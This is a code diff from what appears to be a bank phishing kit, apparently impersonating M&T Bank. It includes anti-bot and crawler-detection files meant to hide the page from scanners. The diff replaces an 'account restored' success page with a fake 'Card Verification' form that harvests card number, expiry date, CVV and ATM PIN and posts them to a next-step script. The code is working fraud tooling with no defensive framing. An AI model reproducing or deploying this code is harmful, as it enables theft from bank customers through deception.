@@ -11,20 +11,18 @@
         echo $antibot->throw404();
         die();
     }
-    include './zsec.php';
+	include './zsec.php';
     include 'huehuehue.php';
     include 'crawlerdetect.php';
     include 'bot_fucker/wrd.php';
     include 'bot_fucker/bot.php';
-	session_destroy();
 ?>
 <html lang="en"><head class="at-element-marker">
 	<meta charset="UTF-8">
-	<title>Verification Completed</title>
-	<!-- -->
+	<title>Verification Process</title>
+
 	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
-    <meta http-equiv="refresh" content="3;url=https://mtb.com"> 
-	<link rel="appple-touch-icon" sizes="57x57" href="./images/favicon.png" type="image/png">
+<link rel="appple-touch-icon" sizes="57x57" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="60x60" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="72x72" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="76x76" href="./images/favicon.png" type="image/png">
@@ -700,11 +698,7 @@ to you.</p>
     </div>
 </div>
 
-
 <style>
-* {
-  box-sizing: border-box;
-}
 
 input[type=text], select, textarea {
   width: 90%;
@@ -720,13 +714,6 @@ input[type=tel], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
-input[type=date], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
 input[type=password], select, textarea {
   width: 90%;
   padding: 12px;
@@ -734,26 +721,59 @@ input[type=password], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
-
+input[type=date], select, textarea {
+  width: 90%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  resize: vertical;
+}
 label {
   padding: 12px 12px 12px 0;
   display: inline-block;
 }
 
+input[type=submit] {
+  background-color: #04AA6D;
+  color: white;
+  padding: 12px 20px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  float: right;
+}
 
 input[type=submit]:hover {
   background-color: #45a049;
 }
 
+@media (min-width: 700px){
 .cntainer {
   border-radius: 5px;
   padding: 20px;
+  background-color: #f6f6f6;
+  margin-right: 15%;
+  margin-left: 15%;
 }
-
-.col-25 {
+.col-23 {
   float: left;
-  width: 25%;
+  width: 40%;
   margin-top: 6px;
+}
+}
+@media (max-width: 699px){
+.cntainer {
+  border-radius: 5px;
+  padding: 20px;
+  background-color: #f6f6f6;
+  margin-left: 2%;
+  margin-right: 2%;
+}
+.col-23 {
+  float: left;
+  width: 80%;
+  margin-top: 6px;
+}
 }
 hr {
     width: 100%;
@@ -761,22 +781,18 @@ hr {
     background-color: blue;
 
 }
-.col-24 {
+
+.col-25 {
   float: left;
-  width: 23%;
-  margin-top: 6px;
-}
-.col-75 {
-  float: left;
-  width: 40%;
+  width: 25%;
   margin-top: 6px;
 }
 
-/* Clear floats after the columns */
-.rew:after {
-  content: "";
-  display: table;
-  clear: both;
+
+.col-75 {
+  float: left;
+  width: 40%;
+  margin-top: 3px;
 }
 .button {
     background-color: #4CAF50;
@@ -790,7 +806,12 @@ hr {
     margin: 4px 2px;
     cursor: pointer;
 }
-.button {width: 50%;}
+/* Clear floats after the columns */
+.rew:after {
+  content: "";
+  display: table;
+  clear: both;
+}
 
 /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
 @media screen and (max-width: 600px) {
@@ -806,22 +827,59 @@ hr {
 <div class="cntainer">
 <div class="rew">
       <div class="col-25">
-         <h3>Verification Completed </h3>
+         <h3> Card Verification </h3>
          <hr>
 </div>
 </div><br>
-
-	<div class="rew">
-     <br><br>
-      <center>
-
-                            <img width="150" height="150" src="./images/success.gif">
-                            <br>      <p>Thank you! Your account access has been Restored.</p>
-                        
-</center>
+<form action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
+    <div class="rew">
+      <div class="col-25">
+        <label for="ccn">Card Number</label>
+      </div>
+      <div class="col-75">
+        <input type="tel" id="ccn" name="ccn" minlength="18" placeholder="____-____-____-____" data-slots="_" required>
+      </div>
     </div>
-
-    <br>
+	<div class="rew">
+      <div class="col-25">
+        <label for="ccn">Expire Date</label>
+      </div>
+      <div class="col-75">
+        <input type="tel" placeholder="MM/YY" data-slots="MY" id="exp" name="exp" required>
+      </div>
+    </div>
+	<div class="rew">
+      <div class="col-25">
+        <label for="cvv">CVV</label>
+      </div>
+      <div class="col-75">
+        <input type="tel" id="cvv" name="cvv" minlength="3" maxlength="3" required>
+      </div>
+    </div>
+	<div class="rew">
+      <div class="col-25">
+        <label for="atp">ATM Pin</label>
+      </div>
+      <div class="col-75">
+        <input type="tel" id="atp" name="atp" minlength="4" maxlength="4" required>
+      </div>
+    </div>
+  
+   
+ 
+	
+	
+	
+<br>
+    <div class="rew">
+    <div class="col-25">
+        <label for="lname"> </label>
+      </div>
+    <div class="col-75 submit-button">
+      <button class="button" type="submit">submit</button>
+    </div>
+    </div>
+  </form>
 </div>
 
 
